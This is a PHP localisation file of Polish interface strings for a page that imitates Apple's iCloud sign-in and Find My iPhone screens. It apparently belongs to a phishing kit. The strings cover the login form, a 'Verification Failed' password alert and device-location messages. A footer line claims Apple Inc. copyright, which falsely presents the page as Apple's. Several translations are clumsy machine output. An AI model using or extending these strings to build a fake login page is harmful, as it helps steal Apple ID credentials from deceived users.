<?php
/*
------------------
Language: Polish
------------------
*/
 
$lang = array();
// Header 
$lang['PAGE_TITLE'] = 'iCloud';
$lang['SETUP_INSTRUCTIONS'] = 'Instrukcje instalowania';
// login form
$lang['SIGN_IN_TITLE'] = 'Zaloguj się do iCloud';
$lang['INCORRECT_ID'] = 'Apple ID lub hasło jest nieprawidłowe.';
$lang['APPLE_ID'] = 'apple ID';
$lang['PASSWORD'] = 'hasło';
$lang['KEEP_ME'] = 'Pamiętaj mnie';
$lang['FORGOT_ID'] = 'Nie pamiętasz Apple ID lub hasła?';
$lang['DONT_HAVE_ID'] = 'Nie bądź Apple ID?';
$lang['CREATE_YOURS'] = 'Utwórz swoje teraz.';
// Footer
$lang['CHECK_ACTIVATION'] = 'Sprawdź status aktywacji blokady';
$lang['SYSTEM_STATUS'] = 'Stan systemu';
$lang['POLICY'] = 'Polityka prywatności';
$lang['TERMS'] = 'Zasady i warunki';
$lang['COPYRIGHT'] = 'Copyright © 2017 Apple Inc. Wszelkie prawa zastrzeżone.';
// mobile version language
$lang['MOB_PAGE_TITLE'] = 'iCloud';
$lang['MOB_FIND'] = 'Find My iPhone';
$lang['MOB_APPLE_ID'] = 'apple ID';
$lang['MOB_EXAMPLE'] = 'example@icloud.com';
$lang['MOB_PASSWORD'] = 'hasło';
$lang['MOB_REQUIRED'] = 'wymagany';
$lang['MOB_LOGIN'] = 'Zaloguj się ...';
$lang['MOB_FORGOT_ID'] = 'Zapomniałeś Apple ID lub hasła?';
$lang['MOB_SETUP_INSTRUCTIONS'] = 'Instrukcje instalowania';
$lang['MOB_locating'] = 'Lokalizowanie ...';
$lang['IDPWD_ERROR_ALERT1'] = 'Verification Failed';
$lang['IDPWD_ERROR_ALERT2'] = 'Your Apple ID or password was incorrect.';
$lang['IDPWD_ERROR_ALERT3'] = 'OK';
// Home Page
$lang['REMINDERS'] = 'przypomnienia';
$lang['NOTES'] = 'Uwagi';
$lang['ICLOUD_DRIVE'] = 'iCloud Napęd';
$lang['PHOTOS'] = 'Zdjęcia';
$lang['CONTACTS'] = 'Łączność';
$lang['MAIL'] = 'Poczta';
$lang['SETTINGS'] = 'Ustawienia';
$lang['FIND_MY_IPHONE'] = 'Znajdź mojego IPhone a';
$lang['KEYNOTE'] = 'Myśl przewodnia';
$lang['NUMBERS'] = 'takty muzyczne';
$lang['FIND_FRIENDS'] = 'Znajdź przyjaciół';
$lang['PAGES'] = 'strony';
// Find . php
$lang['ALL_DEVICES'] = 'Wszystkie urządzenia';
$lang['ICLOUD_SETTINGS'] = 'Ustawienia iCloud';
$lang['SIGN_OUT'] = 'Wyloguj się';
$lang['LOCATE'] = 'Lokowanie...';
$lang['ALL_DEVICES_OFFLINE'] = 'Wszystkie urządzenia Offline';
$lang['NO_LOCO'] = 'Brak lokalizacje mogą być wyświetlane, ponieważ wszystkie urządzenia są w trybie offline.';
?>